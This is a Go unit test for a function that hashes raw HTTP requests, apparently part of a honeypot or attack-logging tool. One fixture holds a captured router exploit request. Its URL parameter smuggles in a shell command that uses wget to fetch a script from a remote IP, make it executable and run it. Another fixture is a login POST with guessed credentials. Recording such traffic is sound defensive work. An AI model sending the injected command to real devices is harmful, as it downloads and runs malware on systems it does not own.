package database

import "testing"

func TestHashRequestOk(t *testing.T) {

	for _, test := range []struct {
		description    string
		rawHttpRequest string
		expectedHash   string
	}{
		{
			description:  "GET request matches",
			expectedHash: "20ac48afc72c7edd024bfa57e0be0717a96ee46b6b1e48e9681968e0ffe6d22c",
			rawHttpRequest: `GET / HTTP/1.1
Host: 203.96.177.140:8080
Content-Length: 0
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36

`,
		},
		{
			description:  "GET request with params",
			expectedHash: "51bd4f5130f7d474e1ebabea701622a13c4eeff98ae42d21cbefcf2a3c7752d7",
			rawHttpRequest: `GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1
Host: 208.123.119.175
Connection: keep-alive
Keep-Alive: timeout=5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246

`,
		},
		{
			description:  "POST request with params",
			expectedHash: "023dada45a78bc1dfc117fd52d4d8ddb3f9ec8cc9a1290bcb02013298421625a",
			rawHttpRequest: `POST /global-protect/login.esp HTTP/1.1
Host: 144.208.127.223
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 140
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203

prot=https%3A&server=144.208.127.223&inputStr=&action=getsoftware&user=Guests&passwd=P%40ssw0rd123&new-passwd=&confirm-new-passwd=&ok=Log+In
`,
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			sum, err := GetHashFromStaticRequestFields(test.rawHttpRequest)
			if err != nil {
				t.Errorf("unexpected error: %s", err)
			}
			if sum != test.expectedHash {
				t.Errorf("expected sum %s, got %s", test.expectedHash, sum)
			}
		})
	}
}
